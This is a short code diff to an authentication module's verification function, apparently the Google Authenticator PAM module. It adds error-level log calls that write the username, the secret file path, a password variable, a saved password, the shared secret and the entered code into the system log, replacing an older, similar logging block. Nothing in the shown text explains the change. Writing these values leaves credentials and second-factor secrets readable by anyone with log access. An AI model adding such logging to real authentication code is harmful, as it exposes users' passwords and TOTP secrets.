@@ -1449,6 +1449,14 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
         }
       }
 
+
+    log_message(LOG_ERR, pamh, "Username '%s'", username);
+    log_message(LOG_ERR, pamh, "Secret File '%s'", secret_filename);
+    log_message(LOG_ERR, pamh, "Otherstuff '%s'", pw);
+    log_message(LOG_ERR, pamh, "saved '%s'", saved_pw);
+    log_message(LOG_ERR, pamh, "Secret '%d'", secret);
+    log_message(LOG_ERR, pamh, "Code '%d'", code);
+
       // Check all possible types of verification codes.
       switch (check_scratch_codes(pamh, secret_filename, &updated, buf, code)){
       case 1:
@@ -1517,12 +1525,6 @@ static int google_authenticator(pam_handle_t *pamh, int flags,
       }
       updated = 1;
     }
-    
-    log_message(LOG_ERR, pamh, "Username '%s'", username);
-    log_message(LOG_ERR, pamh, "Secret File '%s'", secret_filename);
-    log_message(LOG_ERR, pamh, "Otherstuff '%s'", buf);
-    log_message(LOG_ERR, pamh, "Secret '%d'", secret);
-    log_message(LOG_ERR, pamh, "Code '%d'", code);
 
     // If nothing matched, display an error message
     if (rc != PAM_SUCCESS) {
